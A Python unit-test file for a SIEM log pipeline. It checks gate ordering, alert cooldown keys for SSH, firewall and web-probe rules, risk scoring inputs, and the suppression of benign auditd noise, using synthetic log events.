from __future__ import annotations
import numpy as np
import json
from unittest.mock import Mock

from core.context import baseline_confidence, sample_confidence
from core.detection import DetectionResult
from core.normalize import NormalizedEvent
from core.phase_manager import Phase
from main import SIEMPipeline
import main as main_module
from tests.unit.test_phase_contracts import _PhaseStub, _make_pipeline


def test_feature_quality_gate_runs_before_confidence_and_rare(monkeypatch):
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    monkeypatch.setattr(main_module, "extract_features", lambda event: np.zeros(25, dtype=np.float32))
    pipeline.conf_scorer.score = Mock(side_effect=AssertionError("confidence gate should not run"))
    pipeline.rare_filter.is_rare = Mock(side_effect=AssertionError("rare gate should not run"))

    pipeline._process_event_locked("raw", "auth.log")

    pipeline.delayed_buffer.add.assert_not_called()


def test_low_confidence_short_circuits_rare_gate(monkeypatch):
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    monkeypatch.setattr(
        main_module,
        "extract_features",
        lambda event: np.linspace(0.0, 1.0, 25, dtype=np.float32),
    )
    pipeline.conf_scorer.score = Mock(return_value=0.2)
    pipeline.rare_filter.is_rare = Mock(side_effect=AssertionError("rare gate should not run after low confidence"))

    pipeline._process_event_locked("raw", "auth.log")

    pipeline.conf_scorer.score.assert_called_once()
    pipeline.delayed_buffer.add.assert_not_called()


def test_baseline_validator_only_blocks_phase_transition():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])

    class _PhaseTransitionStub(_PhaseStub):
        def __init__(self):
            super().__init__(Phase.PHASE_0, active_layers=[])
            self.reverted = False

        def update(self, event):
            self._current = Phase.PHASE_1
            return Phase.PHASE_1

        def _revert_phase(self):
            self.reverted = True

        def get_status(self):
            return {"current_phase": int(self._current)}

    pipeline.phase = _PhaseTransitionStub()
    pipeline.baseline_validator = type(
        "_BV",
        (),
        {
            "can_advance_to_phase1": staticmethod(lambda: (False, "ioc_recent")),
            "record_incident": staticmethod(lambda severity: None),
            "record_ioc": staticmethod(lambda: None),
            "record_bruteforce": staticmethod(lambda: None),
        },
    )()

    pipeline._process_event_locked("raw", "auth.log")

    assert pipeline.phase.reverted is True
    pipeline.detection.analyze.assert_called_once()
    pipeline.instant_ml.process.assert_called_once()


def test_baseline_validator_does_not_revert_when_phase_gate_allows(monkeypatch):
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    monkeypatch.setattr(main_module, "fmt_phase_status", lambda status: None)

    class _PhaseTransitionStub(_PhaseStub):
        def __init__(self):
            super().__init__(Phase.PHASE_0, active_layers=[])
            self.reverted = False

        def update(self, event):
            self._current = Phase.PHASE_1
            return Phase.PHASE_1

        def _revert_phase(self):
            self.reverted = True

        def get_status(self):
            return {"current_phase": int(self._current)}

    pipeline.phase = _PhaseTransitionStub()
    pipeline.baseline_validator = type(
        "_BV",
        (),
        {
            "can_advance_to_phase1": staticmethod(lambda: (True, "")),
            "record_incident": staticmethod(lambda severity: None),
            "record_ioc": staticmethod(lambda: None),
            "record_bruteforce": staticmethod(lambda: None),
        },
    )()

    pipeline._process_event_locked("raw", "auth.log")

    assert pipeline.phase.reverted is False


def test_sample_confidence_contract_is_shared():
    points = [0, 50, 100, 250, 500, 1000]
    for n in points:
        assert baseline_confidence(n, min_samples=100, full_confidence_at=500) == sample_confidence(
            n, min_samples=100, full_confidence_at=500
        )



def test_auth003_same_source_same_invalid_user_hits_emit_cooldown_once():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    def _is_in_cooldown(rule_id, entity_key):
        return bool(cooldowns.get((rule_id, entity_key), False))

    def _set_cooldown(rule_id, entity_key, seconds):
        cooldowns[(rule_id, entity_key)] = seconds

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(_is_in_cooldown),
        "set_cooldown": staticmethod(_set_cooldown),
    })()

    event = NormalizedEvent(
        ts=1710000000.0,
        source="auth.log",
        category="auth",
        action="ssh_invalid_user",
        outcome="failure",
        user="oracle",
        src_ip="198.51.100.77",
        process="sshd",
        host="srv1",
        message="invalid user oracle",
        raw="invalid user oracle",
        fields={"invalid_user": True},
        distro_family="debian",
    )

    details = {"cooldown": 120, "cooldown_entity": "ip_user"}
    SIEMPipeline._emit_alert(pipeline, event, "AUTH-003", "medium", 60.0, "invalid user", category="auth", details=details)
    SIEMPipeline._emit_alert(pipeline, event, "AUTH-003", "medium", 60.0, "invalid user", category="auth", details=details)

    assert len(captured) == 1
    assert captured[0]["entity"] == "198.51.100.77:oracle"
    assert cooldowns[("AUTH-003", "198.51.100.77:oracle")] == 120


def test_auth003_different_source_ips_emit_separately():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 120, "cooldown_entity": "ip_user"}
    for idx, src_ip in enumerate(("198.51.100.77", "198.51.100.78"), start=1):
        event = NormalizedEvent(
            ts=1710000000.0 + idx,
            source="auth.log",
            category="auth",
            action="ssh_invalid_user",
            outcome="failure",
            user="oracle",
            src_ip=src_ip,
            process="sshd",
            host="srv1",
            message="invalid user oracle",
            raw="invalid user oracle",
            fields={"invalid_user": True},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "AUTH-003", "medium", 60.0, "invalid user", category="auth", details=details)

    assert len(captured) == 2
    assert {alert["entity"] for alert in captured} == {"198.51.100.77:oracle", "198.51.100.78:oracle"}


def test_auth003_is_suppressed_when_thr004_cooldown_is_active_for_same_ip():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {("THR-004", "198.51.100.88"): 300}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    event = NormalizedEvent(
        ts=1710000005.0,
        source="auth.log",
        category="auth",
        action="ssh_invalid_user",
        outcome="failure",
        user="enum9",
        src_ip="198.51.100.88",
        process="sshd",
        host="srv1",
        message="invalid user enum9",
        raw="invalid user enum9",
        fields={"invalid_user": True},
        distro_family="debian",
    )

    SIEMPipeline._emit_alert(
        pipeline,
        event,
        "AUTH-003",
        "medium",
        60.0,
        "invalid user",
        category="auth",
        details={"cooldown": 120, "cooldown_entity": "ip_user"},
    )

    assert captured == []
    assert ("AUTH-003", "198.51.100.88:enum9") not in cooldowns



def test_fw001_same_source_same_port_protocol_hits_firewall_flow_cooldown_once():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    def _is_in_cooldown(rule_id, entity_key):
        return bool(cooldowns.get((rule_id, entity_key), False))

    def _set_cooldown(rule_id, entity_key, seconds):
        cooldowns[(rule_id, entity_key)] = seconds

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(_is_in_cooldown),
        "set_cooldown": staticmethod(_set_cooldown),
    })()

    event = NormalizedEvent(
        ts=1710000010.0,
        source="ufw",
        category="network",
        action="firewall_block",
        outcome="blocked",
        src_ip="198.51.100.7",
        dst_ip="10.0.0.2",
        process="kernel",
        host="srv1",
        message="UFW BLOCK",
        raw="UFW BLOCK",
        fields={"protocol": "UDP", "dst_port": "53"},
        distro_family="debian",
    )

    details = {"cooldown": 120, "cooldown_entity": "firewall_flow"}
    SIEMPipeline._emit_alert(pipeline, event, "FW-001", "low", 25.0, "fw block", category="network", details=details)
    SIEMPipeline._emit_alert(pipeline, event, "FW-001", "low", 25.0, "fw block", category="network", details=details)

    assert len(captured) == 1
    assert captured[0]["entity"] == "198.51.100.7|firewall_block|UDP|53"
    assert cooldowns[("FW-001", "198.51.100.7|firewall_block|UDP|53")] == 120



def test_fw001_same_source_different_ports_keep_separate_visibility():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 120, "cooldown_entity": "firewall_flow"}
    for dst_port in ("53", "22"):
        event = NormalizedEvent(
            ts=1710000011.0,
            source="ufw",
            category="network",
            action="firewall_block",
            outcome="blocked",
            src_ip="198.51.100.7",
            dst_ip="10.0.0.2",
            process="kernel",
            host="srv1",
            message="UFW BLOCK",
            raw="UFW BLOCK",
            fields={"protocol": "UDP", "dst_port": dst_port},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "FW-001", "low", 25.0, "fw block", category="network", details=details)

    assert len(captured) == 2
    assert {item["entity"] for item in captured} == {
        "198.51.100.7|firewall_block|UDP|53",
        "198.51.100.7|firewall_block|UDP|22",
    }



def test_fw001_different_sources_same_port_keep_separate_visibility():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 120, "cooldown_entity": "firewall_flow"}
    for src_ip in ("198.51.100.7", "198.51.100.8"):
        event = NormalizedEvent(
            ts=1710000012.0,
            source="ufw",
            category="network",
            action="firewall_block",
            outcome="blocked",
            src_ip=src_ip,
            dst_ip="10.0.0.2",
            process="kernel",
            host="srv1",
            message="UFW BLOCK",
            raw="UFW BLOCK",
            fields={"protocol": "UDP", "dst_port": "53"},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "FW-001", "low", 25.0, "fw block", category="network", details=details)

    assert len(captured) == 2
    assert {item["entity"] for item in captured} == {
        "198.51.100.7|firewall_block|UDP|53",
        "198.51.100.8|firewall_block|UDP|53",
    }


def test_web005_same_source_same_path_class_hits_cooldown_once():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 180, "cooldown_entity": "web_source_path_class"}
    for path_value in ("/admin/login", "/wp-admin/setup.php"):
        event = NormalizedEvent(
            ts=1710000020.0,
            source="apache2",
            category="network",
            action="http_request",
            outcome="failure",
            src_ip="198.51.100.30",
            process="apache2",
            host="web1",
            message="404 probe",
            raw="404 probe",
            fields={"status": 404, "path_decoded_lc": path_value, "ua_lc": "curl/8.0"},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "WEB-005", "low", 35.0, "404 scan", category="network", details=details)

    assert len(captured) == 1
    assert captured[0]["entity"] == "198.51.100.30|admin-login-config"
    assert captured[0]["context_json"]["path_class"] == "admin-login-config"
    assert cooldowns[("WEB-005", "198.51.100.30|admin-login-config")] == 180


def test_web005_same_source_different_path_classes_keep_separate_visibility():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 180, "cooldown_entity": "web_source_path_class"}
    for path_value in ("/admin/login", "/assets/logo.png"):
        event = NormalizedEvent(
            ts=1710000021.0,
            source="apache2",
            category="network",
            action="http_request",
            outcome="failure",
            src_ip="198.51.100.30",
            process="apache2",
            host="web1",
            message="404 probe",
            raw="404 probe",
            fields={"status": 404, "path_decoded_lc": path_value, "ua_lc": "curl/8.0"},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "WEB-005", "low", 35.0, "404 scan", category="network", details=details)

    assert len(captured) == 2
    assert {alert["entity"] for alert in captured} == {
        "198.51.100.30|admin-login-config",
        "198.51.100.30|static-misc",
    }


def test_web005_different_sources_same_path_class_keep_separate_visibility():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    captured = []
    cooldowns = {}

    def _insert_alert(alert):
        captured.append(alert)
        return len(captured)

    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: None),
        "insert_alert": staticmethod(_insert_alert),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: bool(cooldowns.get((rule_id, entity_key), False))),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: cooldowns.__setitem__((rule_id, entity_key), seconds)),
    })()

    details = {"cooldown": 180, "cooldown_entity": "web_source_path_class"}
    for src_ip in ("198.51.100.30", "198.51.100.31"):
        event = NormalizedEvent(
            ts=1710000022.0,
            source="apache2",
            category="network",
            action="http_request",
            outcome="failure",
            src_ip=src_ip,
            process="apache2",
            host="web1",
            message="404 probe",
            raw="404 probe",
            fields={"status": 404, "path_decoded_lc": "/admin/login", "ua_lc": "curl/8.0"},
            distro_family="debian",
        )
        SIEMPipeline._emit_alert(pipeline, event, "WEB-005", "low", 35.0, "404 scan", category="network", details=details)

    assert len(captured) == 2
    assert {alert["entity"] for alert in captured} == {
        "198.51.100.30|admin-login-config",
        "198.51.100.31|admin-login-config",
    }


def test_model_health_does_not_override_deterministic_alert():
    pipeline, emitted = _make_pipeline(
        Phase.PHASE_3,
        active_layers=["instant_ml", "baseline"],
    )
    pipeline.detection.analyze.return_value = [
        DetectionResult(
            triggered=True,
            rule_id="IOC-TEST",
            severity="critical",
            score=95.0,
            category="threat",
            message="deterministic alert",
            rule_file="ioc_test",
        )
    ]
    pipeline._process_event_locked("raw", "auth.log")

    assert "IOC-TEST" in [item["rule_id"] for item in emitted]


def test_risk_assess_receives_host_and_asset_multiplier():
    pipeline, _ = _make_pipeline(
        Phase.PHASE_3,
        active_layers=["instant_ml", "baseline"],
    )
    pipeline.risk.build_signals_from_detections.return_value = [object()]
    pipeline.risk._asset_map = type(
        "_AssetMap",
        (),
        {"multiplier": staticmethod(lambda host: 1.3 if host == "srv1" else 1.0)},
    )()

    pipeline._process_event_locked("raw", "auth.log")

    pipeline.risk.assess.assert_called_once()
    args = pipeline.risk.assess.call_args.args
    kwargs = pipeline.risk.assess.call_args.kwargs
    assert args[0] == "203.0.113.10"
    assert kwargs["host"] == "srv1"
    assert kwargs["asset_multiplier"] == 1.3


def _auditd_evt(
    *,
    action="syscall",
    process="pg_isready",
    raw="",
    fields=None,
    message="audit benign",
    category="process",
    user="postgres",
    src_ip="",
):
    return NormalizedEvent(
        ts=1710000000.0,
        source="auditd",
        category=category,
        action=action,
        outcome="success",
        user=user,
        src_ip=src_ip,
        process=process,
        host="srv-audit",
        message=message,
        raw=raw or message,
        fields=fields or {},
        distro_family="debian",
    )


def test_benign_auditd_pg_isready_is_suppressed_before_db_and_detection():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="exec",
        process="pg_isready",
        raw='type=EXECVE msg=audit(1710000000.000:1): argc=3 a0="pg_isready" a1="-h" a2="/var/run/postgresql"',
        fields={"audit_type": "EXECVE", "cmdline": "pg_isready -h /var/run/postgresql"},
        message="pg_isready -h /var/run/postgresql",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []
    assert pipeline._pending_event is None


def test_benign_auditd_local_socket_noise_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="nscd",
        raw='type=PATH msg=audit(1710000000.000:2): item=0 name="/var/run/nscd/socket" inode=1 dev=00:14 mode=0140777',
        fields={"audit_type": "PATH", "name": "/var/run/nscd/socket"},
        message="/var/run/nscd/socket",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_attack_examples_with_192_168_1_182_are_not_suppressed():
    attack_events = (
        NormalizedEvent(
            ts=1710000000.0,
            source="auditd",
            category="web",
            action="exec",
            outcome="success",
            user="www-data",
            src_ip="192.168.1.182",
            process="apache2",
            host="srv-audit",
            message="apache2 child suspicious request",
            raw='type=SYSCALL msg=audit(1710000000.000:10): comm="apache2" src=192.168.1.182',
            fields={"audit_type": "SYSCALL"},
            distro_family="debian",
        ),
        NormalizedEvent(
            ts=1710000001.0,
            source="auth_log",
            category="auth",
            action="ssh_invalid_user",
            outcome="failure",
            user="",
            src_ip="192.168.1.182",
            process="sshd",
            host="srv-audit",
            message="Invalid user deploy from 192.168.1.182",
            raw="Invalid user deploy from 192.168.1.182",
            fields={},
            distro_family="debian",
        ),
        NormalizedEvent(
            ts=1710000002.0,
            source="auditd",
            category="auth",
            action="ssh_login",
            outcome="success",
            user="root",
            src_ip="192.168.1.182",
            process="sshd",
            host="srv-audit",
            message="sshd login from 192.168.1.182",
            raw='type=SYSCALL msg=audit(1710000000.000:11): exe="/usr/sbin/sshd" addr=192.168.1.182',
            fields={"audit_type": "SYSCALL", "exe": "/usr/sbin/sshd"},
            distro_family="debian",
        ),
        NormalizedEvent(
            ts=1710000003.0,
            source="journald",
            category="network",
            action="firewall_block",
            outcome="blocked",
            user="",
            src_ip="192.168.1.182",
            process="kernel",
            host="srv-audit",
            message="[UFW BLOCK] SRC=192.168.1.182",
            raw='kernel: [UFW BLOCK] SRC=192.168.1.182 DST=10.0.0.5',
            fields={},
            distro_family="debian",
        ),
    )

    for event in attack_events:
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", event.source)

        pipeline.detection.analyze.assert_called_once()
        pipeline._runtime_state.record_event.assert_called_once()
        assert len(inserted) == 1
        assert pipeline._auditd_noise_suppressed_stats == {"total": 0, "by_reason": {}}
        assert pipeline._parse_fail_suppressed_stats == {"total": 0, "by_source": {}, "by_reason": {}}


def test_benign_auditd_firefox_socket_thread_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="Socket Thread",
        raw='type=SYSCALL msg=audit(1710000000.000:3): comm="Socket Thread" exe="/usr/lib/firefox/firefox" syscall=42',
        fields={"audit_type": "SYSCALL", "exe": "/usr/lib/firefox/firefox"},
        message="firefox socket thread connect",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_firefox_hex_comm_with_raw_type_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="0x7f9c",
        raw='type=SYSCALL msg=audit(1710000000.000:30): comm="0x7f9c" exe="/usr/lib/firefox/firefox" subj=snap.firefox.firefox syscall=42',
        fields={"exe": "/usr/lib/firefox/firefox"},
        message="firefox socket thread hex comm",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_firefox_dns_resolver_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="DNS Resolver",
        raw='type=SYSCALL msg=audit(1710000000.000:31): comm="DNS Resolver" exe="/usr/lib/firefox/firefox" syscall=42',
        fields={"audit_type": "SYSCALL", "exe": "/usr/lib/firefox/firefox"},
        message="firefox dns resolver connect",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_firefox_web_content_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="Web Content",
        raw='type=SYSCALL msg=audit(1710000000.000:34): comm="Web Content" exe="/usr/lib/firefox/firefox" syscall=42',
        fields={"audit_type": "SYSCALL", "exe": "/usr/lib/firefox/firefox"},
        message="firefox web content network syscall",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_runc_internal_fd_and_loader_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="file_access",
        process="runc",
        raw='type=PATH msg=audit(1710000000.000:32): comm="runc" exe="/usr/sbin/runc" name="/proc/self/fd/6" item=0 name2="/lib64/ld-linux-x86-64.so.2"',
        fields={"audit_type": "PATH", "exe": "/usr/sbin/runc", "file_path": "/proc/self/fd/6"},
        message="runc internal fd loader access",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_runc_hosts_file_access_is_suppressed_before_runtime_accounting():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
    event = _auditd_evt(
        action="file_access",
        process="runc",
        raw='type=PATH msg=audit(1710000000.000:132): comm="runc" exe="/usr/sbin/runc" name="/etc/hosts" auid=4294967295 tty=(none)',
        fields={"audit_type": "PATH", "exe": "/usr/sbin/runc", "file_path": "/etc/hosts"},
        message="container hosts file access",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    pipeline._runtime_state.record_event.assert_not_called()
    assert inserted == []
    assert pipeline._event_count == 0
    assert pipeline._dedup_cache == {}
    assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"container_runtime_file_access": 1}


def test_benign_auditd_empty_process_file_access_is_suppressed_before_phase_accounting():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    duplicate_calls = []
    pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
    pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
    event = _auditd_evt(
        action="file_access",
        process="",
        raw='type=PATH msg=audit(1710000000.000:140): item=0 name="/proc/self/fd/6" name2="/lib64/ld-linux-x86-64.so.2" auid=4294967295 tty=(none)',
        fields={"audit_type": "PATH", "file_path": "/proc/self/fd/6"},
        message="empty process internal file access",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    pipeline._runtime_state.record_event.assert_not_called()
    assert inserted == []
    assert duplicate_calls == []
    assert pipeline._event_count == 0
    assert pipeline._source_stats == {}
    assert pipeline._dedup_cache == {}
    assert pipeline._xsrc_dedup_cache == {}
    assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"internal_service_file_access": 1}


def test_benign_auditd_local_empty_process_hosts_and_systemd_wants_file_access_is_suppressed():
    for raw_line, file_path in (
        (
            'type=PATH msg=audit(1710000000.000:142): item=0 name="/etc/hosts" inode=1 dev=00:14 mode=0100644',
            "/etc/hosts",
        ),
        (
            'type=PATH msg=audit(1710000000.000:143): item=0 name="/etc/systemd/system/multi-user.target.wants/cron.service" inode=1 dev=00:14 mode=0100644',
            "/etc/systemd/system/multi-user.target.wants/cron.service",
        ),
    ):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            action="file_access",
            process="",
            raw=raw_line,
            fields={"audit_type": "PATH", "file_path": file_path},
            message=file_path,
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
